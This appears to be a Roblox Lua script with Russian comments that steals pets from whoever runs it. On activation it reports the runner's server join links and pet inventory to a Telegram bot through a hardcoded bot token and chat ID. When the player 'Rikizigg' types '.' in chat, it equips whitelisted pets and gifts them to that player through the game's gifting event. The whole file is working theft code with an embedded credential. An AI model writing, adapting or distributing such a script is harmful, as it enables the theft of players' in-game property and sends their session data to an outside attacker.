local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local player = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "Rikizigg"
local TRIGGER_MESSAGE = "."
local DELAY = 2

-- 🐾 БЕЛЫЙ СПИСОК
local WHITELIST = {
    "Hamster"
}

-- 🌐 Генерация рабочих ссылок
local function getServerLinks()
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    return {
        direct = string.format("roblox://placeID=%d&gameInstanceID=%s", placeId, jobId),
        web = string.format("https://www.roblox.com/games/%d?gameInstanceId=%s", placeId, jobId),
        joinCmd = string.format("/join %s", jobId)
    }
end

-- 🔎 Поиск питомцев
local function getPets()
    local pets = {}
    local backpack = player:FindFirstChild("Backpack") or player.Character
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            local name, weight, age = item.Name:match("^([^%[]+)%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
            if name then
                name = name:gsub("%s+$", "")
                table.insert(pets, {
                    name = name,
                    object = item,
                    weight = tonumber(weight),
                    age = tonumber(age),
                    inWhitelist = table.find(WHITELIST, name) ~= nil
                })
            end
        end
    end
    
    return pets
end

-- ✋ Взять в руку
local function equipPet(pet)
    if pet and player.Character and player.Character:FindFirstChild("Humanoid") then
        player.Character.Humanoid:EquipTool(pet)
        task.wait(1)
        return true
    end
    return false
end

-- 📤 Передать питомца
local function transferPet(pet, target)
    if not pet.inWhitelist then return false end
    
    local service = ReplicatedStorage:FindFirstChild("GameEvents")
    if not service then return false end
    
    local gifting = service:FindFirstChild("PetGiftingService")
    if not gifting then return false end
    
    return pcall(function()
        gifting:FireServer("GivePet", target)
    end)
end

-- 📨 Отправка в Telegram
local function sendToTelegram(text)
    local url = string.format(
        "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
        TELEGRAM_TOKEN,
        TELEGRAM_CHAT_ID,
        HttpService:UrlEncode(text)
    )
    pcall(function() game:HttpGet(url) end)
end

-- 🚀 Основная функция
local function processTransfer()
    local links = getServerLinks()
    local pets = getPets()
    local message = string.format(
        "🔔 %s начал передачу\n"..
        "🔗 Прямое подключение: %s\n"..
        "🌐 Веб-ссылка: %s\n"..
        "⌨ Команда: %s\n\n"..
        "🐾 Доступные питомцы (%d):\n",
        player.Name,
        links.direct,
        links.web,
        links.joinCmd,
        #pets
    )
    
    -- Формируем список
    for _, pet in ipairs(pets) do
        message = message .. string.format(
            "%s %s [%.2f кг, Age %d]\n",
            pet.inWhitelist and "✓" or "✗",
            pet.name,
            pet.weight,
            pet.age
        )
    end
    
    sendToTelegram(message)
    
    -- Передача
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if not target then
        sendToTelegram("❌ Игрок не найден на сервере")
        return
    end
    
    for _, pet in ipairs(pets) do
        if pet.inWhitelist then
            if equipPet(pet.object) then
                local success = transferPet(pet, target)
                sendToTelegram(string.format(
                    "%s %s [%s]",
                    success and "✅" or "❌",
                    pet.name,
                    success and "успех" or "ошибка"
                ))
                task.wait(DELAY)
            end
        end
    end
end

-- 👂 Активация по команде
game.Players.PlayerChatted:Connect(function(_, speaker, message)
    if speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
        processTransfer()
    end
end)

-- 🏁 Стартовое уведомление
sendToTelegram(string.format(
    "🔄 %s активировал скрипт\n"..
    "Ожидаю команду '%s' от %s\n"..
    "✓ - будут переданы\n✗ - игнорируются",
    player.Name,
    TRIGGER_MESSAGE,
    TARGET_PLAYER
))
